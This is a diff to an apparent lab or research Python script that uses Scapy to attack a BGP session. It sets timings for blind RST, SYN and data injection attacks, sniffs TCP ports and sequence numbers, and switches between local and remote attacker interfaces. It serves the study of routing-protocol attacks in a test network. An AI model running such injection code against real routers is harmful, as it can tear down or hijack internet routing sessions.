@@ -11,11 +11,15 @@ from random import randint
 from utils import log, log2
 from custom_classes import CustomBGPPathAttribute
 
+
 load_contrib("bgp")
 
 
+REMOTE_ATTACK = 1 # 0 => local, 1 => remote
+
 SOURCE_ADDRESS = '9.0.1.2'
 DESTINATION_ADDRESS = '9.0.1.1'
+
 BLIND_RST_ATTACK_COLLECT_TIME = 15 * 4 # <keepalive> * 4
 BLIND_SYN_ATTACK_COLLECT_TIME = 15 * 2 # <keepalive> * 2
 BLIND_DATA_ATTACK_COLLECT_TIME = 45 + 15 * 2 # <hold-timer> + <keep-alive> * 2
@@ -107,7 +111,6 @@ def send_update_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, se
 
 
 def extract_ports_and_numbers(row, srcIP, dstIP):
-	print row
 	srcPort, dstPort, seqNum, ackNum, win = None, None, None, None, None
 
 	values = row.split(' ')
@@ -119,8 +122,6 @@ def extract_ports_and_numbers(row, srcIP, dstIP):
 	dstAddr = '.'.join(b[0:4])
 
 	l = values[20].replace(':', '')
-	print l
-	print values[7]
 
 	#if srcAddr == srcIP and dstAddr == dstIP and 
 	if values[7] == 'seq' and l == '0':
@@ -137,13 +138,6 @@ def extract_ports_and_numbers(row, srcIP, dstIP):
 		ackNum = values[10].replace(',', '')
 
 		win = values[12].replace(',', '')
-
-	print
-	print 'srcAddr, dstAddr'
-	print srcAddr, dstAddr
-	print 'srcPort, dstPort, seqNum, ackNum, win'
-	print srcPort, dstPort, seqNum, ackNum, win
-	print
 
 	return srcPort, dstPort, seqNum, ackNum, win
 
@@ -207,8 +201,6 @@ def analyze_second_row(row):
 def analyze_third_row(row):
 	print 'processing third row'
 	print row
-
-	values = row.split(' ')
 
 	sys.stdout.flush()
 
@@ -289,24 +281,46 @@ def main():
 	assert choice >= 1
 	assert choice <= 3
 
-	parent_pid = int(sys.argv[2])
+	iface = None
+	eth0_mac_address = sys.argv[2]
+	eth1_mac_address = sys.argv[3]
+	r2_eth4_mac_address = sys.argv[4]
+	r2_eth5_mac_address = sys.argv[5]
 
-	src_mac_address = sys.argv[3]
-	print '\natk1 source MAC address', src_mac_address
+	print 'eth0_mac_address', eth0_mac_address
+	print 'eth1_mac_address', eth1_mac_address
+	print 'r2_eth4_mac_address', r2_eth4_mac_address
+	print 'r2_eth5_mac_address', r2_eth5_mac_address
 
-	dst_mac_address = sys.argv[4]
-	print 'R2 destination MAC address', dst_mac_address
-	log('wait for the attacker to retrieve AN and SN', 'yellow')
-	print
+	log('wait for the attacker to retrieve AN and SN\n', 'yellow')
 
 	sys.stdout.flush()
 
+	# recupero AN e SN per evitare il bruteforce di AN e SN
 	srcPort, dstPort, ackNum, seqNum, win = retrieve_ports_and_numbers('atk1-eth1', SOURCE_ADDRESS, DESTINATION_ADDRESS)
+
+	if REMOTE_ATTACK == 0:
+		iface = 'atk1-eth1'
+		src_mac_address = eth1_mac_address
+		dst_mac_address = r2_eth5_mac_address
+	else:
+		iface = 'atk1-eth0'
+		src_mac_address = eth0_mac_address
+		dst_mac_address = r2_eth4_mac_address
+
+	assert iface is not None
+	assert src_mac_address is not None
+	assert dst_mac_address is not None
 	assert srcPort is not None
 	assert dstPort is not None
 	assert seqNum is not None
 	assert ackNum is not None
 	assert win is not None
+
+	print os.popen('date +\"%T.%6N\"').read()
+	print 'iface', iface
+	print 'src mac address', src_mac_address
+	print 'dst mac address', dst_mac_address
 	print 'src port', srcPort
 	print 'dst port', dstPort
 	print 'seq number', seqNum
@@ -315,20 +329,6 @@ def main():
 	print
 
 	sys.stdout.flush()
-
-	# DESTINATION_NETWORK = '9.0.0.0'
-	DESTINATION_NETWORK = '9.0.1.0'
-
-	# TODO understand if you have to use 
-	# atk1-eth0 (9.0.0.0)
-	# or 
-	# atk1-eth1 (9.0.1.0)
-	if DESTINATION_NETWORK == '9.0.0.0':
-		iface = 'atk1-eth0'
-	else:
-		iface = 'atk1-eth1'
-		src_mac_address = 'aa:aa:aa:aa:aa:02'
-		dst_mac_address = '22:22:22:22:22:05'
 
 	collect_time = 0
 
